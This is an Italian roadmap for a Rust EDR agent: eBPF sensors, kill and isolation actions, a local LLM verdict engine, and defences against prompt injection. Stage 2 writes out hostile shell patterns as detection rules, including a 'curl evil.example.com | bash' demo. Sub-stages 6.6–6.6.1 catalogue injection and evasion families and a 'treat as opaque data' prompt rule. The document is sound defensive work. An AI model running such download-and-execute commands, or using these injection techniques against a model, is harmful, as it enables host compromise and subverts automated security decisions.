# NorthNarrow — Roadmap di esecuzione

> Linux first. 100% Rust. Una tappa alla volta, in ordine fisso.
> Non si salta. Non si torna indietro. Demo visibile ad ogni tappa.

Per la mappa completa di lungo termine (hypervisor Ring -1, anti-DMA,
CET, PQC, honeypots, micro-segmentazione), vedi VISION_TECHNICAL.md.
Quella è la stella polare. Questa è la marcia operativa.

---

## Tappa 0 — Fondamenta del repo

Obiettivo: struttura del workspace Rust pronta per costruire sopra.

- Cargo workspace con membri: agent/, common/, cli/
- Dipendenze base: tokio, tracing, serde, anyhow, thiserror
- CI minimale (cargo build, cargo test, cargo clippy, cargo fmt)
- README pulito, LICENSE (Apache-2.0), CONTRIBUTING

Demo: `cargo build` verde su Linux x86_64.

---

## Tappa 1 — Primo sensore eBPF Rust (Aya)

Obiettivo: vedere ogni processo che parte sul sistema.

- Programma eBPF Rust con framework Aya, no_std
- Tracepoint su sched_process_exec
- Userland Rust legge eventi via ringbuffer
- Eventi serializzati in formato canonico Event::ProcessSpawn

Demo: lanci l'agent, apri un terminale, esegui `ls`. L'agent stampa
"ProcessSpawn pid=X comm=ls cmdline=..."

---

## Tappa 2 — Decision engine base (regole hardcoded)

Obiettivo: primo cervello. Niente LLM ancora. Solo regole esplicite.

- Modulo decision::rules con ~10 regole iniziali (hardcoded)
- Esempi: `curl | bash`, `chmod +x /tmp/*`, `nc -e /bin/sh`
- Output: Verdict { action: ResponseAction, severity: Severity }
- ResponseAction = enum (Log, KillProcess, BlockOutbound, ...)
  ma per ora SOLO Log viene eseguito

Demo: esegui `curl evil.example.com | bash`. Agent logga
"VERDICT: KillProcess (severity: High) — would kill pid X" ma il
processo continua. Vedi che il cervello ragiona.

---

## Tappa 3 — Mani che colpiscono: KillProcess reale

Obiettivo: PRIMA VOLTA che NorthNarrow uccide qualcosa davvero.

- Modulo response::executor::kill
- kill_process(pid) via nix::sys::signal::kill(SIGKILL)
- kill_process_tree(pid) walk di /proc per trovare i figli
- Wiring nel decision engine: se verdict = KillProcess, esegui davvero
- Test: spawn un processo finto (sleep 1000), simulazione verdict
  KillProcess, asserisci che è morto in <100ms

Demo: ripeti il test della Tappa 2. Stavolta il bash viene UCCISO.
NorthNarrow è ora un difensore, non più un osservatore.

---

## Tappa 4 — Sensori eBPF completi

Obiettivo: copertura totale degli eventi rilevanti.

- LSM hook bprm_check_security (controllo exec)
- LSM hook file_open (FIM file integrity monitoring)
- Kprobe su tcp_v4_connect e tcp_v6_connect (rete uscente)
- Kprobe su udp_sendmsg per filtrare DNS queries
- Tutti i sensori in Rust+Aya, no C, no_std

Demo: flusso eventi multi-categoria visibile in tempo reale.

---

## Tappa 5 — Esecutori response completi

Obiettivo: tutte le azioni difensive concrete, non solo Kill.

- BlockOutbound(pid) — nftables via crate rustables o syscalls
- FullNetworkIsolation — drop di tutto tranne mTLS verso C2
- Quarantine(path) — sposta il file in /var/lib/northnarrow/quarantine/,
  cifrato con AES-256-GCM (aes-gcm crate Rust puro)
- ThrottleProcess(pid) — cgroup v2 CPU/IO limits

Demo: ransomware finto cifra file in /tmp/lab/. NorthNarrow
killa il processo + isola la macchina + quarantena il binario.
Tutto in <500ms.

---

## Tappa 6 — Cervello LLM locale (Candle)

Obiettivo: decisioni euristiche su casi ambigui.

- Crate candle-core + candle-transformers (100% Rust, zero C/C++)
- Modello quantizzato Q4 (Gemma 2B o Mistral 7B Q4)
- Inferenza locale, <2GB RAM
- Pipeline: regole hardcoded (Tappa 2) decidono prima. Casi ambigui
  passano all'LLM con prompt strutturato
- Output dell'LLM: {verdict, confidence, reasoning}. Se confidence 
  soglia → escalation umano (livello B)

Demo: binario sconosciuto eseguito. Regole non lo classificano.
LLM lo analizza (filename, syscalls, network behavior) e decide.

### Sub-tappa 6.1 — Backend candle reale (chiusa)

- Backend candle Llama 3.1 GGUF Q4_K_M, 100% Rust.
- Foundation-Sec-8B-Reasoning come modello di default.
- Smoke test runnable + bench example.
- Tracing prefill/decode + ADE_DEMO_LIMIT.

### Sub-tappa 6.5 — Adaptive Defensive Posture (chiusa)

- State machine 4-tier persistente cross-eventi: OBSERVING → ALERTED
  → ENGAGED → COMBAT (ordinati per gravità).
- `agent::posture::PostureMachine` come handle Arc-backed,
  Send + Sync. `observe(event, recent_events)` notifica eventi e
  ritorna Some(stato) sulle transizioni; `modulate_verdict(v)`
  applica severity-inflation + Allow→Alert in ALERTED+; `tick_decay`
  fa decadere la posture (1h ALERTED→OBSERVING, 24h ENGAGED→
  ALERTED, COMBAT mai).
- `common::posture_types` per i tipi serializable (audit log).
- 12 trigger-types (Reconnaissance, SuspiciousDns, SensitiveFileAccess,
  Lolbas, ExploitAttempt, AdjacentCompromise, HeavyReconnaissance,
  CriticalFileModification, ConfirmedIntrusion, PersistenceMechanism,
  LateralMovement, ExfiltrationPattern).
- Decay timer su `std::time::Instant` (immune a NTP).
- Exit da COMBAT: stub `admin_release_combat(bool)`. Tappa 8 lo
  sostituisce con verifier Ed25519.
- ADE schema invariato (v1.0.0). Modulazione preserva la regola
  `Allow ⇔ severity == None`.

Differenziatore strutturale: tutti gli EDR commerciali 2026
valutano gli eventi in isolamento. NorthNarrow no — la posture
ricorda quel che ha visto e diventa più aggressiva man mano che le
prove si accumulano.

Demo: `cargo run -p northnarrow-agent --release --example
posture_demo` mostra le transizioni OBSERVING→ALERTED→ENGAGED→
COMBAT, una modulazione Allow→Alert in ALERTED, e l'admin override
che riporta a ENGAGED.

### Sub-tappa 6.6 — ADE Hardening contro Prompt Injection (chiusa)

Obiettivo: rendere ADE robusto a filename/argv/env manipolati
dall'attaccante che fingono di essere istruzioni per il modello.
Difese in profondità (4 strati):

1. **Sanitization preprocessing** (`agent::ade::sanitize`):
   filtra instruction keywords, special chat-template tokens
   (Llama 3.1, ChatML), homoglyph Cirillico/Greco, zero-width chars,
   bidi-control, non-printable, argv overlong. Calcola un
   `injection_score` 0..1.
2. **Structured prompting** (`agent::ade::structured_prompt`):
   wrappa i campi untrusted in delimitatori XML-style
   (`=== UNTRUSTED EVENT DATA ===`) e li presenta sia in base64 sia
   decodificati, con priming "treat as opaque data" prima e dopo.
3. **Sanity check post-verdict** (`agent::ade::sanity_check`):
   intercetta verdetti incoerenti (alto injection_score + Allow,
   tactic TA0040/TA0010 + Allow, severe IoC + Low) e li sostituisce
   con un Escalate Tier1 sintetico schema-valido. Inconsistencies
   meno gravi vengono solo flaggate in metadata.
4. **Dual-model verification stub** (`agent::ade::dual_verify`):
   per Kill/KillTree/Quarantine/Isolate/BlockOutbound/Throttle
   richiede il via libera da `DeterministicVerifier` (no Kill su
   pid<1000, Isolate solo con severity Critical, Kill conf≥0.70,
   ecc.). Tappa 6.6+ sostituirà con un secondo LLM call.

Early reject: `injection_score ≥ 0.90` causa Escalate sintetico
senza spendere un round-trip di inferenza.

Demo: `cargo run -p northnarrow-agent --release --example
ade_attacks` lancia 40 attacchi sintetici classificati in 7
categorie (direct injection via filename, indirect via comm/argv,
encoding evasion, multi-language, schema exploits, context
flooding, social engineering) e produce un report
BLOCKED/PARTIAL/FOOLED per categoria. Richiede il modello GGUF
caricato (~7-20 min su CCX23). Le 4 layers + lo schema parser
catturano la maggior parte delle famiglie di attacco prima che il
modello le veda.

ADE schema invariato (v1.0.0). Posture machine (Sub-tappa 6.5)
non modificata. Rule engine, sensori, executor non modificati.

### Sub-tappa 6.6.1 — Layer 1 detectors estesi (chiusa)

Chiude le 4 famiglie di attacchi che in 6.6 superavano Layer 1
(sanitization) e arrivavano fino a Layer 3/4:

- **Multilingual keyword dictionary** — IT/ES/FR/DE/PT/RU/ZH/JA/AR.
  La detection runna su tre viste: input troncato grezzo (per
  catturare cirillico / Han / arabo prima della homoglyph
  replacement), il `buf` sanificato (per il latino), e il
  `lower`+`_-.→spazio` normalizzato. Nuovo flag
  `MultilingualKeyword { lang, keyword }`.
- **ROT13 normalizer** — su stringhe ASCII di lunghezza ≥ 8 senza
  caratteri non-Latini, applica `normalize_rot13` e ricontrolla
  contro il dizionario EN. Nuovo flag
  `RotEncoded { original, decoded }`.
- **Visual substitution detector** — confronta il basename del
  filename contro una lista di binari di sistema
  (`SYSTEM_BINARY_LOOKALIKES`: ls, ssh, sudo, …) usando una
  tabella di lookalike (`l↔1↔I↔|`, `s↔5↔$`, `o↔0↔O`, …). Match
  quando ogni posizione che differisce è un lookalike registrato.
  Nuovo flag `VisualSubstitution { suspected_target, actual }`.
- **Variant separator detector** — riconosce
  `northnarrow-`/`_`/`.`/`|`/spazio (e simili per `system:`,
  `[INST]`, ecc.) come tentativi di evadere il match canonico
  `northnarrow:`. Nuovo flag
  `VariantSeparator { canonical, variant }`.

Score weights: ognuno dei 4 nuovi flag pesa 0.40-0.45 (in linea
con `InstructionKeyword`); HomoglyphDetected sale da 0.20 a 0.30
per riflettere la sua natura multi-script.

12 unit test nuovi nel modulo `agent::ade::sanitize::tests`.

Effetto sul demo `ade_attacks`: D1, D2, C4, G3, G4 — i 5 attacchi
che in 6.6 erano marcati come "slip Layer 1" — ora producono
`injection_score ≥ 0.40` al primo strato, e in molti casi
sufficiente a innescare l'early-reject Tier1Review (soglia 0.90)
quando si combinano con altri segnali.

ADE schema invariato (v1.0.0). Posture machine, structured prompt,
sanity check, dual verify (gli altri 3 strati di Sub-tappa 6.6)
non modificati.

### Sub-tappa 6.7 — RAG knowledge base architetturale (chiusa)

Aggiunge un layer di Retrieval-Augmented Generation tra l'evento
e l'inferenza: prima che ADE chiami il modello, una knowledge base
locale curata di 30 documenti viene interrogata via cosine
similarity e gli hit più rilevanti vengono iniettati nel prompt
come blocco TRUSTED. Risultato: ADE riconosce TTPs, IoCs, e
threat-tooling che il modello base non conosce
(post-knowledge-cutoff).

Componenti:

- `common::rag_types` — tipi serializzabili (`KbCategory`,
  `KbDocument`, `RagDocument`, `RagResult`, `KB_EMBEDDING_DIM=384`).
- `agent::rag::embedder` — `RagEmbedder` con embedding deterministico
  via FNV-1a-hashed character 3- e 4-grams in 384 buckets,
  L2-normalizzato. Stand-in per un futuro bge-small-en-v1.5 caricato
  via candle.
- `agent::rag::store` — `RagStore` in-memory con scan lineare
  cosine top-k filtrato da soglia di similarità. Scelto al posto
  di LanceDB perché lancedb 0.10 trascina datafusion + arrow-array
  e raddoppia il tempo di compilazione, senza benefici a scala
  30 documenti (lo scan lineare è in microsecondi).
- `agent::rag::retrieval` — `RagEngine::with_seed(model_path)` +
  `retrieve(RagQuery)`. Default top_k=3, min_similarity=0.15
  (calibrata sul stand-in n-gram; con bge-small reale andrebbe
  alzata a ~0.4).
- `agent::rag::kb_seed` — 30 documenti hardcoded distribuiti
  esattamente per la spec: 10 MITRE technique, 5 Sigma rule, 5
  LOLBAS, 5 Linux pattern, 5 threat tool.
- `agent::ade::rag_integration` — `build_rag_query_from_event`
  (process spawn → "process {comm} from {filename}", DNS →
  "dns query from {comm} to {qname}", TCP → "...port {port}", …)
  e `format_rag_block` (rende RagResult come blocco TRUSTED nel
  prompt strutturato, posizionato dopo l'host context e prima dei
  dati untrusted).
- `agent::ade::AdeEngine::with_rag(rag)` — wiring opt-in che
  preserva byte-identicamente il comportamento pre-6.7 quando il
  RAG è assente (tutti i test esistenti continuano a passare).

Esempi (manual-run, non in CI):

- `examples/rag_demo.rs` — 5 query canoniche → top-3 hit per query.
- `examples/ade_with_rag.rs` — stesso evento (Cobalt Strike beacon)
  valutato side-by-side con e senza RAG.

Test: 32 nuovi test sempre-on (8 embedder, 7 store, 4 kb_seed, 8
retrieval, 5 rag_integration). 0 ignored introdotti dalla 6.7. ADE
schema invariato (v1.0.0).

Deviazioni dalla spec (autorizzate dalla spec stessa, documentate
nei commit):

- LanceDB → vector store custom in-memory (deps troppo pesanti).
- bge-small candle → hashed n-gram embedder (BERT GGUF non è
  first-class in candle 0.10, fuori dal MINIMAL scope).

Materiale per Sub-tappa 6.7+: caricamento bge-small reale via
candle, persistenza on-disk del KB, ingestion da MITRE GitHub /
Sigma / LOLBAS, threshold-tuning con embeddings semantici.

### Sub-tappa 6.8 — Performance Optimization Pass (chiusa)

Tre leve CPU-side per portare la latency end-to-end di ADE da
~25 minuti (1500 token a 0.94 tok/s decode su Hetzner CCX23) verso
i ~5 minuti necessari per uso realtime, senza GPU, senza redesign
schema, senza cambiare modello (Foundation-Sec 8B Q4_K_M resta).

Strati introdotti:

- **Strato 1 — Hardware diagnostic.** `examples/diag_hw.rs`
  stampa CPU model, ISA flags, fisici/logici, RAM, e due
  micro-bench (matmul f32 single-thread + sequential read 1 GB)
  che identificano se il deployment host è compute-bound o
  memory-bound. Baseline CCX23: AMD EPYC Milan, AVX2+FMA+F16C,
  ~19 GFLOPS single-thread, ~36 GB/s — documentato in
  `docs/PERFORMANCE_HARDWARE.md`.
- **Strato 2 — Build flags.** `.cargo/config.toml` esporta
  `target-cpu=native` (FMA + AVX-512 quando presenti).
  `[profile.release]` passa da `lto = "thin"` a `lto = "fat"`,
  `codegen-units = 1`, `panic = "abort"`, `opt-level = 3`. Build
  time ~30 s → ~160 s su CCX23 (peak link RAM ~6-8 GiB, gestibile).
  Profilo `release-bench` separato preserva i symbol per `perf`.
  Speedup atteso: 1.3-1.5× su candle CPU kernels.
- **Strato 3 — Thread tuning.** `AdeConfig` espone
  `num_threads: Option<usize>` con `effective_threads()` che
  default-a `physical_cores − 1`. `CandleBackend::configure_threads`
  pinna `RAYON_NUM_THREADS` prima del primo init del global pool
  rayon. CLI `--ade-threads N` ovverride. `examples/bench_threads.rs`
  walkka N ∈ {1,2,3,4} in subprocess (rayon è lazy-init una volta
  per processo) e stampa l'optimum. Documentato in
  `docs/PERFORMANCE_THREADS.md`.
- **Strato 4 — Streaming + early JSON termination.** Il levere
  più grosso. `InferenceBackend.generate_streaming` (con
  `StreamControl::Continue|Stop`) è opzionale e default-impl
  cade su `generate` con singolo callback finale (Mock + altri
  backend restano byte-compatibili). `CandleBackend` implementa
  streaming reale: dopo ogni token decoded, tokenizer.decode
  incrementale produce solo il suffisso nuovo, UTF-8-boundary
  aware. `agent::ade::streaming_parser::StreamingJsonDetector`
  traccia brace-depth, string-mode, escape-mode lungo lo stream
  e segnala completamento al primo `}` outermost.
  `AdeEngine::evaluate` cabla detector + `Stop`: appena il JSON
  chiude, il decode loop si ferma. Atteso: ~1500 → ~400-500
  token decoded per inferenza, 3-4× wall-time saving su host
  memory-bound.
- **Strato 5 — Persistent backend audit.** Verificato per
  ispezione che `AdeEngine::new` viene chiamato una sola volta
  in `agent/src/main.rs`, fuori dal loop eventi, e l'`Arc<AdeEngine>`
  risultante viene condiviso in `process_event` per ogni iterazione.
  Comment-guard aggiunto al construction site per impedire
  regressioni future.

Test: 12 nuovi test sempre-on (8 `StreamingJsonDetector` + 3
`AdeConfig::effective_threads` + 1 integrazione streaming/non-
streaming verdict-equality). Totale workspace: 277 test passati,
0 falliti, 5 ignored. Schema `AdeVerdict` invariato (v1.0.0).
ADE pipeline (sanitize, sanity_check, dual_verify, RAG, posture)
invariata.

Speedup teorico combinato (NON misurato in autopilot — sarà
benchato dal founder con `bench_threads` + run reale di
`ade_demo` post-deploy): ~5×, pari a ~5 minuti per output tipico
di 1500 token su CCX23.

Out of scope, rinviato a sub-tappa successive:

- GPU / Metal / CUDA support → Sub-tappa 6.9+.
- Schema redesign per output compatto → Sub-tappa 6.9 Compact
  Output (renderebbe lo streaming meno necessario, ma sono
  ortogonali e indipendenti).
- Modello più piccolo (Foundation-Sec 8B resta production
  choice).
- Speculative decoding / draft models.

Deviazioni dalla spec autorizzate, documentate nei commit:

- `lld` non è disponibile sull'host CCX23 (May 2026); la
  link-arg `-fuse-ld=lld` è stata omessa, default-linker
  preservato. Build time aumentato di ~30 s rispetto al lld
  ipotetico, accettabile.
- Default `effective_threads()` ritorna 1 sul CCX23
  (2 physical → 2-1 = 1) ma il bench atteso identifica 2-3
  come optimum reale; il default è conservativo, l'override
  via CLI è il path produzione.

---

## Tappa 7 — Anti-tamper Linux

Obiettivo: l'agent non si può uccidere né disabilitare.

- BPF-LSM hook task_kill — nega SIGKILL/SIGTERM verso il PID
  dell'agent (escluso un canale firmato Ed25519)
- BPF-LSM hook ptrace_access_check — nega ptrace al daemon
- Protezione del filesystem /var/lib/northnarrow/ (chattr +i + LSM)
- Watchdog: secondo processo che riavvia il daemon se cade

Demo: `sudo kill -9 <pid_agent>` → il segnale viene NEGATO dal
kernel. Anche root non lo uccide.

---

## Tappa 8 — Riattivazione supervisionata (sigillo crittografico)

Obiettivo: isolamento di rete che si sblocca solo con chiave admin.

- Coppia di chiavi ed25519-dalek. Pubblica nel daemon, privata nel
  Key Vault aziendale (offline o HSM)
- Stato di isolamento persistito in file immutabile (chattr +i)
- Al boot, l'agent legge lo stato. Se "isolato" → blocca rete via
  nftables/XDP all'avvio prima che tocchi l'OS
- Comando di sblocco: token firmato Ed25519 inserito dall'admin via CLI
  locale. Verifica firma → libera la rete
- Recovery key di emergenza generata all'install, da custodire in
  cassaforte aziendale

Demo: macchina isolata. Reboot. Resta isolata. Admin inserisce token
firmato → rete torna su.

---

## Tappa 9 — UI locale Rust nativa

Obiettivo: interfaccia accattivante, 100% Rust, niente Electron.

- Valutazione pratica tra: Iced, Slint, Tauri+Yew (Rust→WASM)
- Decisione presa con prototipo veloce di una sola pagina dashboard
- Implementazione: lista alert real-time, bottoni azione manuale,
  status agent, log filtrabili
- Design: scuro, militare, leggibile. Niente UI da SaaS generico.

Demo: apri la GUI, vedi alert in tempo reale, clicchi "Quarantena"
su un evento manuale, l'azione parte.

---

## Tappa 10 — Scout proattivo (assessment + hardening)

Obiettivo: all'installazione, NorthNarrow chiude le falle.

- Scanner di postura Linux:
  - Permessi SUID/SGID anomali
  - sshd_config (RootLogin, PasswordAuthentication)
  - SELinux/AppArmor status
  - Servizi esposti su rete
  - CVE noti del kernel installato
- LLM ragiona su priorità + propone fix
- Modalità auto-fix (con conferma admin la prima volta)
  vs solo-report

Demo: installi NorthNarrow su VM con config debole. Scan in 30s,
report di 12 falle, 8 fixate in automatico, 4 segnalate per review.

---

## Tappa 11 — Windows agent: sensori user-mode (ETW)

Obiettivo: parità Linux→Windows senza affrontare ancora kernel driver.

- Sensori basati su Event Tracing for Windows via crate ferrisetw
- Cattura: process creation, network connections, file operations,
  registry writes
- Riuso di tutto il decision engine, executor, LLM dalle Tappe 1-6
- Esecutori Windows: OpenProcess + TerminateProcess,
  Windows Filtering Platform user-mode API per blocco rete

Demo: stesso ransomware test della Tappa 5, eseguito su Windows.
Stessa risposta: kill + isolamento.

---

## Tappa 12 — Windows kernel driver (quando maturo)

Obiettivo: anti-tamper kernel-grade su Windows.

- Valutazione windows-drivers-rs maturità (oggi è preview)
- Se ancora preview → manteniamo ETW user-mode + hardening WDAC come
  alternativa
- Se production-ready → minifilter + ObCallbacks in Rust no_std
- Firma driver Microsoft (€€€) e WHQL submission

Decisione gate: prima di iniziare questa tappa, audit della maturità
di windows-drivers-rs. Se non production-ready, si rimanda e si
passa alla Tappa 13.

---

## Tappa 13 — Backend C2 EU sovrano

Obiettivo: flotta multi-agent coordinata, EU-sovereign.

- Server in Rust (Axum)
- mTLS via rustls
- NATS JetStream per ingestion eventi
- ClickHouse per cold storage
- VictoriaMetrics per metriche
- Storage object: Garage (sovereignty tier)
- Deployable on-prem o cloud EU only

Demo: 3 agent (2 Linux + 1 Windows) connessi al C2. Dashboard
mostra flotta in tempo reale.

---

## Tappa 14 — Console centrale (fleet management)

Obiettivo: admin gestisce la flotta da un'unica UI.

- Estensione della UI di Tappa 9 in modalità "console centrale"
- Lista host, alert aggregati, override livelli autonomia per host
- Key Vault management per recovery delle chiavi
- Reporting compliance (NIS2, ISO 27001, GDPR)

Demo: console mostra 50 host simulati, alert filtrabili per host,
azione di massa "isola tutti gli host con verdict=High".

---

## Tappa 15 — Hardening avanzato selettivo (da v3 di Gemini)

Obiettivo: innesti delle feature avanzate dove hanno ROI massimo.

Selezione a quel punto in base a:
- Threat landscape attuale
- Feedback beta clienti
- Maturità delle tecnologie scelte

Candidati (in VISION_TECHNICAL.md per dettaglio):
- Honeypots locali (deception layer)
- JA4 fingerprinting
- Anti-BYOVD (driver blocklist Windows)
- IOMMU enforcement Linux
- Patching virtuale via eBPF

---

## Tappa 16 — Beta privata

Obiettivo: validazione su 5-10 organizzazioni vere.

- Recruitment beta tester (PMI italiane, EU)
- Onboarding assistito
- Feedback loop settimanale
- Bug fix + iterazione

---

## Tappa 17 — Lancio pubblico

Obiettivo: NorthNarrow disponibile commercialmente.

- Sito, pricing, sales funnel
- Documentation completa
- Compliance certifications avviate (NIS2 readiness, eIDAS where applicable)
- Customer success
- Lancio comunicato

---

## Regola d'oro

Una tappa alla volta. Non si salta. Non si torna indietro.
Quando una tappa è chiusa e testata, si passa alla prossima.
Se Claude (qualsiasi versione) prova a cambiare ordine senza che il
founder lo richieda esplicitamente, ha torto Claude.

Modifiche a questa roadmap richiedono modifica esplicita del file da
parte del founder. Non si modifica per consenso conversazionale.
